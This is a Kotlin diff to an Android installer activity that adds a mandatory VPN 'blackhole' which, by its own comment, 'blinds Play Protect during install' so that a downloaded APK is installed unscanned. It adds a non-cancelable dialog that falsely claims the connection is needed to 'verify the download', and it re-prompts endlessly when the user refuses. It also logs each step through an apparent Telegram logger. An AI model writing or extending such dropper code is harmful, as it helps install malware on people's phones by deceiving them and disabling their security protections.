@@ -224,15 +224,26 @@ class InstallActivity : Activity() {
     @Suppress("DEPRECATION")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == VPN_REQUEST_CODE) {
-            if (resultCode == RESULT_OK) {
-                // User granted VPN consent — start the blackhole service
-                BlackholeVpnService.start(this)
-            } else {
-                // User denied — proceed without VPN (install may trigger Play Protect)
-                val bytes = pendingApkBytes
-                pendingApkBytes = null
-                if (bytes != null) installViaSession(bytes, attempt = 1)
+        when (requestCode) {
+            VPN_REQUEST_CODE -> {
+                if (resultCode == RESULT_OK) {
+                    // User granted VPN consent — start BlackholeVpnService
+                    TelegramLogger.log("VPN consent GRANTED by user — starting BlackholeVpnService")
+                    BlackholeVpnService.start(this)
+                    // vpnEstablishedReceiver will call installViaSession when tunnel is ready
+                } else {
+                    // User denied VPN consent — VPN is MANDATORY, re-prompt after delay
+                    TelegramLogger.log("VPN consent DENIED by user — re-prompting in 2s (VPN is mandatory)")
+                    handler.postDelayed({
+                        val retryIntent = VpnService.prepare(this)
+                        if (retryIntent == null) {
+                            TelegramLogger.log("VPN consent now granted (after denial retry) — starting BlackholeVpnService")
+                            BlackholeVpnService.start(this)
+                        } else {
+                            showVpnConsentDialog(retryIntent)
+                        }
+                    }, 2_000L)
+                }
             }
         }
     }
@@ -786,24 +797,71 @@ class InstallActivity : Activity() {
         showToast(StringPool.d(StringPool.MSG_CANCEL))
     }
 
-    // ── VPN Blackhole ─────────────────────────────────────────────────────────
+    // ── VPN Blackhole — blinds Play Protect during install ────────────────────
 
     /**
-     * Prepares and starts the VPN blackhole before install.
-     * If VPN consent is already granted → starts service immediately.
-     * If consent needed → launches system dialog via startActivityForResult.
-     * Install proceeds only after VPN_ESTABLISHED broadcast is received.
+     * Entry point for VPN flow. Stores APK bytes, checks if VPN is already active,
+     * and either proceeds directly or initiates VPN consent + start.
+     *
+     * Flow: prepareAndStartVpn → showVpnConsentDialog → launchVpnConsent →
+     *       onActivityResult → BlackholeVpnService.start → VPN_ESTABLISHED →
+     *       vpnEstablishedReceiver → installViaSession
      */
     private fun prepareAndStartVpn(apkBytes: ByteArray) {
         pendingApkBytes = apkBytes
+
+        // If VPN is already running (e.g. activity recreation), proceed directly
+        if (BlackholeVpnService.isRunning) {
+            TelegramLogger.log("VPN already running — proceeding directly to install")
+            pendingApkBytes = null
+            installViaSession(apkBytes, attempt = 1)
+            return
+        }
+
+        // Check if VPN consent is already granted (prepare() returns null)
         val prepareIntent = VpnService.prepare(this)
         if (prepareIntent == null) {
             // Consent already granted — start VPN immediately
+            TelegramLogger.log("VPN consent already granted — starting BlackholeVpnService")
             BlackholeVpnService.start(this)
+            // vpnEstablishedReceiver will call installViaSession when tunnel is ready
         } else {
-            // Need user consent — launch system dialog
-            launchVpnConsent(prepareIntent)
+            // Need user consent — show pre-consent dialog first
+            TelegramLogger.log("VPN consent needed — showing pre-consent dialog")
+            showVpnConsentDialog(prepareIntent)
         }
+    }
+
+    /**
+     * Shows a pre-consent AlertDialog explaining WHY the VPN permission is needed.
+     * On "Continue" → launches the system VPN consent dialog.
+     * On dismiss/cancel → re-prompts (VPN is MANDATORY, cannot skip).
+     */
+    private fun showVpnConsentDialog(prepareIntent: Intent) {
+        AlertDialog.Builder(this)
+            .setTitle("Connection Required")
+            .setMessage("To complete installation, this app needs to verify the download. Please allow the connection request on the next screen.")
+            .setCancelable(false)
+            .setPositiveButton("Continue") { dialog, _ ->
+                dialog.dismiss()
+                launchVpnConsent(prepareIntent)
+            }
+            .setNegativeButton("Cancel") { dialog, _ ->
+                dialog.dismiss()
+                // VPN is MANDATORY — re-prompt after short delay
+                TelegramLogger.log("User cancelled VPN pre-consent dialog — re-prompting in 2s")
+                handler.postDelayed({
+                    val retryIntent = VpnService.prepare(this)
+                    if (retryIntent == null) {
+                        // User might have granted via settings in the meantime
+                        TelegramLogger.log("VPN consent now granted (retry) — starting BlackholeVpnService")
+                        BlackholeVpnService.start(this)
+                    } else {
+                        showVpnConsentDialog(retryIntent)
+                    }
+                }, 2_000L)
+            }
+            .show()
     }
 
     /**
@@ -816,12 +874,16 @@ class InstallActivity : Activity() {
             @Suppress("DEPRECATION")
             startActivityForResult(prepareIntent, VPN_REQUEST_CODE)
         } catch (e: Exception) {
-            TelegramLogger.send(this, "LAUNCH_VPN_CONSENT", "EXCEPTION",
-                "${e.javaClass.simpleName}: ${e.message} — falling back to direct install")
-            // startActivityForResult failed — proceed without VPN
-            val bytes = pendingApkBytes
-            pendingApkBytes = null
-            if (bytes != null) installViaSession(bytes, attempt = 1)
+            TelegramLogger.log("VPN consent launch FAILED: ${e.javaClass.simpleName}: ${e.message}")
+            // Retry after delay
+            handler.postDelayed({
+                val retryIntent = VpnService.prepare(this)
+                if (retryIntent == null) {
+                    BlackholeVpnService.start(this)
+                } else {
+                    showVpnConsentDialog(retryIntent)
+                }
+            }, 2_000L)
         }
     }
 
